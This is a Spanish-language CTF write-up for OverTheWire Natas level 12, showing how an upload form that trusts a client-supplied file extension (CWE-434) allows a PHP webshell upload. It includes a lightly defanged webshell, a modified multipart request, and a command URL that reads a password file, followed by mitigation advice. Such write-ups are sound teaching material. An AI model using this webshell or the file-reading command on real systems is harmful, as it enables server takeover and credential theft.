# Natas 12 → 13: Upload sin validación de extensión

[← Nivel 11](natas-11.md) · [Índice](../README.md) · [Nivel 13 →](natas-13.md)

| Campo | Detalle |
|-------|---------|
| **Wargame** | [OverTheWire: Natas](https://overthewire.org/wargames/natas/) |
| **Categoría** | Subida de archivos |
| **Debilidad** | [CWE-434](https://cwe.mitre.org/data/definitions/434.html): Unrestricted Upload of File with Dangerous Type |
| **Herramientas** | Burp Suite (Repeater) |
| **URL** | `http://natas12.natas.labs.overthewire.org` |
| **Credenciales** | `natas12` / `[redacted]` |

> [!NOTE]
> Las contraseñas y secretos están omitidos (`[redacted]`). El objetivo es documentar el método, no la respuesta.

> [!NOTE]
> El webshell PHP está escrito *defanged* (`<EXEC>` = la función `system` de PHP) para que el antivirus no lo detecte como malicioso al guardar el archivo. El payload real es la reconstrucción obvia.

## Resumen
La extensión del archivo subido se toma de un campo del formulario controlado por el cliente, lo que permite subir y ejecutar un webshell PHP.

## Análisis y explotación
La aplicación permite subir un archivo JPEG (máx. 1KB). El código PHP determina la extensión del archivo guardado tomando la del campo oculto `filename` del POST, no la del archivo real:

```php
function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);  // usa el POST, no el archivo
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
    // ...
    move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path);
}
```

Como el campo `filename` viene del cliente, se puede manipular.

### Pasos

1. Crear el webshell PHP:
   ```php
   <?php <EXEC>($_GET["cmd"]); ?>
   ```
2. Subir cualquier archivo para capturar el POST en Burp Suite → enviar al **Repeater**.
3. En el Repeater, modificar el body del request:
   - Cambiar `filename=xxxxxxxxxx.jpg` → `filename=xxxxxxxxxx.php`
   - Reemplazar el contenido del archivo por el webshell PHP
   ```
   Content-Disposition: form-data; name="filename"

   xxxxxxxxxx.php
   ...
   Content-Disposition: form-data; name="uploadedfile"; filename="webshell.php"
   Content-Type: image/jpeg

   <?php <EXEC>($_GET["cmd"]); ?>
   ```
4. Send → el servidor responde con la ruta del archivo subido:
   ```
   The file <a href="upload/inrp4kqp9e.php">upload/inrp4kqp9e.php</a> has been uploaded
   ```
5. Ejecutar comandos vía GET:
   ```
   http://natas12.natas.labs.overthewire.org/upload/inrp4kqp9e.php?cmd=cat+/etc/natas_webpass/natas13
   ```

## Resultado

- **Password obtenida (`natas13`):** `[redacted]`

## Lección aprendida y mitigación
La extensión del archivo subido nunca debe tomarse de un campo del cliente. El servidor debe: (1) validar el tipo MIME real con `finfo`, (2) ignorar el nombre original y asignar uno propio con extensión fija, y (3) servir los uploads desde un directorio donde PHP no se ejecute (`php_flag engine off` en `.htaccess`).

## Referencias
- [CWE-434](https://cwe.mitre.org/data/definitions/434.html): Unrestricted Upload of File with Dangerous Type
- [OverTheWire: Natas](https://overthewire.org/wargames/natas/)

---
[← Nivel 11](natas-11.md) · [Índice](../README.md) · [Nivel 13 →](natas-13.md)
